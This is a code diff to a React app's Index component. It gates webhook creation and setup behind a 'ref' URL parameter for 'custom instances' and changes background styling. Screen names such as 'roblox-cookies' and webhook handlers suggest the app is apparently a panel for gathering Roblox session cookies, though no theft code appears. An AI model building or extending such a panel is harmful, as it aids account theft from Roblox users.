@@ -19,6 +19,10 @@ type Screen =
 const Index = () => {
   const [currentScreen, setCurrentScreen] = useState<Screen>("login");
 
+  // Check if this is a custom instance
+  const urlParams = new URLSearchParams(window.location.search);
+  const isCustomInstance = urlParams.get("ref");
+
   const handleLoginSuccess = () => {
     setCurrentScreen("dashboard");
   };
@@ -52,7 +56,10 @@ const Index = () => {
           <Dashboard
             onDeleteGmail={handleDeleteGmail}
             onDeleteVerifyGmail={handleDeleteVerifyGmail}
-            onCreateWebhook={handleCreateWebhook}
+            // Only pass webhook creation function if NOT a custom instance
+            onCreateWebhook={
+              !isCustomInstance ? handleCreateWebhook : undefined
+            }
           />
         );
       case "roblox-cookies":
@@ -70,7 +77,11 @@ const Index = () => {
           />
         );
       case "webhook-setup":
-        return <WebhookSetup onBack={handleBackToDashboard} />;
+        // Only allow webhook setup for main instance
+        if (!isCustomInstance) {
+          return <WebhookSetup onBack={handleBackToDashboard} />;
+        }
+        return <PasswordLogin onSuccess={handleLoginSuccess} />;
       case "success":
         return (
           <SuccessNotification onBackToDashboard={handleBackToDashboard} />
@@ -82,11 +93,11 @@ const Index = () => {
 
   return (
     <div className="min-h-screen relative overflow-hidden">
-      {/* Darker gradient background - more black than blue */}
-      <div className="absolute inset-0 bg-gradient-to-br from-black via-gray-900 to-slate-800" />
+      {/* Enhanced darker gradient background */}
+      <div className="absolute inset-0 bg-gradient-to-br from-black via-gray-900 to-slate-900" />
 
-      {/* Additional overlay for more darkness */}
-      <div className="absolute inset-0 bg-black/30" />
+      {/* Additional dark overlay for more professional look */}
+      <div className="absolute inset-0 bg-black/40" />
 
       {/* Weather effects */}
       <RainEffect />
